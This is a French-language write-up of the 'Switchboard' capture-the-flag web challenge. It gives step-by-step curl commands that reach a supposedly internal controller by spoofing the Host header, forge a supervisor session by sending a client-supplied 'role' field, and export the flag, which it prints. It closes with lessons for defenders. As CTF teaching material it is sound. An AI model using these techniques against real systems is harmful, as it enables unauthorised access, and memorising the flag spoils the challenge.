---
tags: [web, ssrf, host-header, mass-assignment, session-forgery]
---

[🇬🇧 English](README.md) · 🇫🇷 Français

# Switchboard

| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
|---|---|---|---|---|---|---|
| web | 120 | 170 | ✅ | — | 0xAr3s-root | Iulian Schifirnet |

## Énoncé

> La Directorate conjointe des opérations de Vardanne, coordonnant la participation de
> Vardanne à la coalition Operation Dawn, exploite un vieux central téléphonique dont le
> tableau public affiche l'état de ses circuits de jonction. Le poste de garde contacte un
> contrôleur de central séparé via la jonction interne, et ce contrôleur peut exporter la
> clé de chiffrement de jonction actuelle, mais seulement pour un superviseur inscrit au
> tableau de service.
>
> Atteignez le contrôleur et exportez la clé. Démarrez votre propre instance depuis cette
> page et travaillez uniquement contre l'adresse qu'elle vous donne.
>
> Format du flag : `CSCTF{...}`

**Cible :** une instance par joueur sur `http://w06.ctf.chronos-security.ro:<port>`
(durée de vie de 30 minutes).

## En bref

Le tableau public de l'état des lignes et le contrôleur de central « réservé au réseau
interne » sont servis par **le même backend, sur le même host:port**, routés uniquement
selon l'en-tête `Host`. Envoyer `Host: exch-ctl.vjod.internal` — un nom d'hôte révélé
seulement en base64 dans le JS du tableau public — atteint directement le contrôleur
(un contournement équivalent à un SSRF, sans même avoir besoin d'un payload SSRF : juste un
en-tête). Le `POST /auth` du contrôleur accepte un champ `role` fourni par le client et
l'intègre sans vérification dans le cookie de session signé (mass assignment), donc
`{"username": "x", "role": "supervisor"}` fabrique gratuitement une session superviseur.
`GET /export/trunk-key` avec ce cookie renvoie le flag.

## Démarche

**1. Reconnaissance — le tableau public**

```bash
curl -s http://w06.ctf.chronos-security.ro:34144/
```

Un simple tableau de bord « Line status » pour les jonctions voix, qui interroge
`GET /api/lines` toutes les 30s. Rien d'exploitable à vue sur le tableau lui-même (JSON en
lecture seule, aucun paramètre SSRF). Le pied de page mentionne un bloc « Service
endpoints » avec une entrée « Exchange controller » affichée comme `checking…`, remplie par
le JS.

**2. La fuite du nom d'hôte dans `switchboard.js`**

```bash
curl -s http://w06.ctf.chronos-security.ro:34144/static/switchboard.js
```

```js
// Exchange controller endpoint, as configured by the NOC. Shown for reference
// only; the browser cannot reach it from here (separate trunk, different host),
// so the live figures below are read from the public status API instead.
var controller = atob("ZXhjaC1jdGwudmpvZC5pbnRlcm5hbA==");
```

`atob("ZXhjaC1jdGwudmpvZC5pbnRlcm5hbA==")` → `exch-ctl.vjod.internal`. Le commentaire
insiste sur le fait que le *navigateur* ne peut pas l'atteindre (« jonction séparée, hôte
différent ») — vrai pour un fetch côté client contraint par la Same-Origin Policy et le
DNS, mais ça ne dit rien de ce qui se passe si *nous*, en tant que client HTTP, demandons
simplement ce Host au même serveur.

**3. Le routage par en-tête Host = SSRF gratuit**

```bash
curl -s http://w06.ctf.chronos-security.ro:34144/ \
  -H "Host: exch-ctl.vjod.internal"
```

Cela renvoie une *application complètement différente* : « Overview - Exchange
controller », « RESTRICTED · STAFF ONLY », avec sa propre table d'API :

| Méthode | Chemin               | But                                           | Accès             |
|---------|----------------------|------------------------------------------------|-------------------|
| POST    | `/auth`              | Ouvre une session opérateur. Body : `username`. | jonction interne  |
| GET     | `/operators`         | Tableau de service et session courante.         | session opérateur |
| GET     | `/export/trunk-key`  | Exporte la clé de chiffrement de jonction.      | **superviseur**   |
| GET     | `/healthz`           | Liveness.                                       | tous              |

Le même processus backend sert deux sites logiques, choisis selon que l'en-tête `Host`
correspond exactement à `exch-ctl.vjod.internal` — tout autre Host (y compris absent ou
quelconque) retombe sur le tableau public. Aucune isolation réseau « jonction interne »
n'est réellement appliquée ; l'affirmation « interne uniquement » est purement cosmétique.

**4. Authentification triviale, puis mass assignment**

```bash
curl -s -X POST http://w06.ctf.chronos-security.ro:34144/auth \
  -H "Host: exch-ctl.vjod.internal" -H "Content-Type: application/json" \
  -d '{"username":"test"}'
# {"ok":true,"operator":"test","role":"operator"}
```

Comme documenté, aucun mot de passe n'est demandé. Le `role` renvoyé est toujours
`"operator"` pour un simple nom d'utilisateur — jusqu'à ce qu'on remarque que le body est
parsé de façon permissive et qu'un champ `role` fourni par le client est accepté
directement :

```bash
curl -s -i -X POST http://w06.ctf.chronos-security.ro:34144/auth \
  -H "Host: exch-ctl.vjod.internal" -H "Content-Type: application/json" \
  -d '{"username":"test","role":"supervisor"}'
```

```
Set-Cookie: ctl_sid=eyJvcGVyYXRvciI6InRlc3QiLCJyb2xlIjoic3VwZXJ2aXNvciJ9.avB34w.Do2O... ; HttpOnly
{"ok":true,"operator":"test","role":"supervisor"}
```

Le contenu décodé du cookie est simplement `{"operator":"test","role":"supervisor"}` — le
serveur signe le rôle qu'on lui donne, il ne le dérive jamais côté serveur à partir du
tableau de service (`GET /operators` montre de vrais superviseurs comme
`R. Antonescu`/`EX-01`, mais usurper leur nom ou leur indicatif ne donne toujours que
`role: "operator"` ; seul l'envoi direct du champ `role` fonctionne).

**5. Export de la clé**

```bash
curl -s http://w06.ctf.chronos-security.ro:34144/export/trunk-key \
  -H "Host: exch-ctl.vjod.internal" \
  -H "Cookie: ctl_sid=eyJvcGVyYXRvciI6InRlc3QiLCJyb2xlIjoic3VwZXJ2aXNvciJ9.avB34w.Do2OxQWWbZo5oKmOcimIHILssIY"
```

```json
{
  "algorithm": "AES-256-GCM",
  "exported_by": "test",
  "key_id": "KTK-2026-10-B",
  "trunk_key": "CSCTF{boqf6PlsFrpSSmqoJjq5FVlq}",
  "valid_from": "2026-11-08T13:17:57Z"
}
```

Script de résolution : [`solve/solve.py`](solve/solve.py)

```bash
python3 solve/solve.py http://w06.ctf.chronos-security.ro:34144
```

```
[+] Reaching internal controller via Host: exch-ctl.vjod.internal
[+] POST /auth -> {'ok': True, 'operator': 'ctf-player', 'role': 'supervisor'}
[+] Session cookie: ctl_sid=...
[+] GET /export/trunk-key -> { ... "trunk_key": "CSCTF{boqf6PlsFrpSSmqoJjq5FVlq}" ... }
[+] Flag: CSCTF{boqf6PlsFrpSSmqoJjq5FVlq}
```

## Flag

`CSCTF{boqf6PlsFrpSSmqoJjq5FVlq}`

## Ce que j'ai appris

- **L'« isolation » par en-tête Host n'est pas une isolation réseau.** Le texte de l'énoncé
  (« le navigateur ne peut pas l'atteindre… jonction séparée, hôte différent ») décrit une
  limitation *côté client* (Same-Origin Policy / résolution DNS), pas un contrôle côté
  serveur. N'importe quel client HTTP capable de fixer un en-tête `Host` arbitraire
  contourne ça instantanément — c'est la même famille de bug que le SSRF classique, sauf
  qu'on n'a même pas besoin que le serveur fasse un proxy pour nous : l'app « interne » est
  directement accessible, sur la même socket exacte.
- **Ne jamais faire confiance à un champ fourni par le client qui influence
  l'autorisation**, surtout quand le nom du champ correspond exactement à un concept de
  privilège interne (`role`). Le correctif est de dériver `role` uniquement côté serveur
  (à partir de l'identité authentifiée confrontée au tableau de service, jamais du corps de
  la requête) et de ne jamais laisser un mass assignment du body atteindre des champs de
  session sensibles.
- Décoder le nom d'hôte en base64 « pour référence uniquement » était le vrai indice que le
  challenge voulait un pivot par en-tête Host plutôt que, disons, un paramètre SSRF
  littéral — quand une appli explique dans un commentaire exactement *pourquoi* on est
  censé ne pas pouvoir atteindre quelque chose, ça vaut la peine de le tester en dehors des
  contraintes du navigateur.

## Outils et références

- `curl -H "Host: ..."` pour atteindre directement un vhost routé par en-tête Host
- Mass assignment : [OWASP — Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- Attaques par en-tête Host : [PortSwigger — HTTP Host header attacks](https://portswigger.net/web-security/host-header)

---
[⬅ Retour à l'événement](../../README.fr.md)
